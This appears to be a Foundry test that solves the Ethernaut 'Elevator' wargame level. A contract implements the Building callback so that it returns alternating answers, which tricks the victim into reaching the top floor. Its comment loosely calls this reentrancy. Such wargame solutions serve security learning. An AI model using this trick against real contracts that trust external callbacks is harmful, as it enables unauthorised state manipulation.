// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Elevator, Building} from "ethernaut/levels/Elevator.sol";

/**
 * title A similar exampel:
 * https://scsfg.io/hackers/reentrancy/#cross-contract-reentrancy
 *
 * The problem is one contract relay on another contract's state
 * Views may yield outdated state information in the context of a reentrancy across contracts.
 */

contract CounterTest is Test, Building {
    Elevator public victim;
    bool public flag = true;

    function setUp() public {
        victim = new Elevator();
    }

    function testAttack() external {
        victim.goTo(999);

        require(victim.top());
    }

    function isLastFloor(uint floor) public override returns (bool) {
        flag = !flag;
        return flag;
    }
}
